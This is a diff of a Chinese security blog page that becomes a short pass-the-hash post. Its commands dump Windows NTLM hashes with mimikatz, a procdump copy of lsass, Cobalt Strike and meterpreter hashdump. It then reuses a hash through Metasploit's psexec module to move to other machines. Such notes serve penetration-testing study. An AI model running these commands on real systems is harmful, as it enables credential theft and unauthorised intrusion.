@@ -94,17 +94,20 @@
 
 
 
-  <meta name="description" content="爱安全，爱旅游，爱生活">
-<meta property="og:type" content="website">
-<meta property="og:title" content="about">
-<meta property="og:url" content="http://onekingcc.github.io/about/index.html">
+  <meta name="description" content="hash获取PASS THE HASH，当我们拿下一台机器后，如果历史有登录过，就可以找到用户的ntlm hash，抓取hash之后，就可以利用这个hash的凭据去撞其他的机器，前提hash采用rc4加密的。 1.上传mimikatz  12privilege::debugsekurlsa::logonpasswords  2.上传procdump.exe 获取lass.dmp 文件，然后mimi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PTH">
+<meta property="og:url" content="http://onekingcc.github.io/2021/07/01/PTH/index.html">
 <meta property="og:site_name" content="onekingcc&#39;s Blog">
-<meta property="og:description" content="爱安全，爱旅游，爱生活">
+<meta property="og:description" content="hash获取PASS THE HASH，当我们拿下一台机器后，如果历史有登录过，就可以找到用户的ntlm hash，抓取hash之后，就可以利用这个hash的凭据去撞其他的机器，前提hash采用rc4加密的。 1.上传mimikatz  12privilege::debugsekurlsa::logonpasswords  2.上传procdump.exe 获取lass.dmp 文件，然后mimi">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-11-12T03:10:30.996Z">
+<meta property="og:image" content="http://onekingcc.github.io/images/js/image-20210701122554034.png">
+<meta property="og:image" content="http://onekingcc.github.io/images/js/image-20210701122922449.png">
+<meta property="og:updated_time" content="2021-07-01T04:41:53.466Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="about">
-<meta name="twitter:description" content="爱安全，爱旅游，爱生活">
+<meta name="twitter:title" content="PTH">
+<meta name="twitter:description" content="hash获取PASS THE HASH，当我们拿下一台机器后，如果历史有登录过，就可以找到用户的ntlm hash，抓取hash之后，就可以利用这个hash的凭据去撞其他的机器，前提hash采用rc4加密的。 1.上传mimikatz  12privilege::debugsekurlsa::logonpasswords  2.上传procdump.exe 获取lass.dmp 文件，然后mimi">
+<meta name="twitter:image" content="http://onekingcc.github.io/images/js/image-20210701122554034.png">
 
 
 
@@ -114,7 +117,7 @@
 
   
   
-  <link rel="canonical" href="http://onekingcc.github.io/about/">
+  <link rel="canonical" href="http://onekingcc.github.io/2021/07/01/PTH/">
 
 
 
@@ -124,7 +127,7 @@
   };
 </script>
 
-  <title>about | onekingcc's Blog</title>
+  <title>PTH | onekingcc's Blog</title>
   
 
 
@@ -226,7 +229,7 @@
         
         
           
-          <li class="menu-item menu-item-about menu-item-active">
+          <li class="menu-item menu-item-about">
 
     
     
@@ -315,73 +318,200 @@
           
             
 
-    
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-    
-
-  
-
-
           
           <div id="content" class="content">
             
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://onekingcc.github.io/2021/07/01/PTH/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="onekingcc">
+      <meta itemprop="description" content="写博客就是为了和过去以及未来的自己对话">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="onekingcc's Blog">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-<h1 class="post-title" itemprop="name headline">about
-
-</h1>
-
-<div class="post-meta">
-  
-  
-
-
-
-</div>
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
-          <pre><code>爱安全，爱旅游，爱生活 </code></pre>
+          <h1 class="post-title" itemprop="name headline">PTH
+
+              
+            
+          </h1>
         
-      </div>
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2021-07-01 00:00:00 / 修改时间：12:41:53" itemprop="dateCreated datePublished" datetime="2021-07-01T00:00:00+08:00">2021-07-01</time>
+            </span>
+          
+
+          
+            
+
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/横向移动/" itemprop="url" rel="index"><span itemprop="name">横向移动</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          <br>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <h5 id="hash获取"><a href="#hash获取" class="headerlink" title="hash获取"></a>hash获取</h5><p>PASS THE HASH，当我们拿下一台机器后，如果历史有登录过，就可以找到用户的ntlm hash，抓取hash之后，就可以利用这个hash的凭据去撞其他的机器，前提hash采用rc4加密的。</p>
+<p>1.上传mimikatz </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>2.上传procdump.exe 获取lass.dmp 文件，然后mimikatz dump哈希</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp </span><br><span class="line">&quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/js/image-20210701122554034.png" alt="image-20210701122554034"></p>
+<p><img src="/images/js/image-20210701122922449.png" alt="image-20210701122922449"></p>
+<p>3.cs 获取hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt;hashdump</span><br></pre></td></tr></table></figure>
+
+<p>4.meterpreter mimikatz自带的hash获取模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;hashdump</span><br><span class="line">meterpreter&gt;run windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>
+
+<h5 id="hash-传递攻击-PTH"><a href="#hash-传递攻击-PTH" class="headerlink" title="hash 传递攻击 PTH"></a>hash 传递攻击 PTH</h5><p>1.msf中利用psexec模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use exploit/windows/smb/psexec</span><br><span class="line">set lhost xxxx</span><br><span class="line">set lport xxx</span><br><span class="line">set rhost xxx</span><br><span class="line">set SMBUser Administrator</span><br><span class="line">set SMBPass xxxxx   # ntlm hash</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>2.cs</p>
+<p>利用psexec模块，选择一个本地hash即可</p>
+
       
     </div>
-    
-
-
 
     
+
     
     
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/06/23/Apache Commons Collections Deserialize Attack 分析/" rel="next" title="Apache Commons Collections Deserialize Attack 分析">
+                <i class="fa fa-chevron-left"></i> Apache Commons Collections Deserialize Attack 分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
   </div>
 
 
@@ -410,8 +540,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -524,6 +663,23 @@
         </div>
       </div>
 
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#hash获取"><span class="nav-number">1.</span> <span class="nav-text">hash获取</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#hash-传递攻击-PTH"><span class="nav-number">2.</span> <span class="nav-text">hash 传递攻击 PTH</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
       
 
       
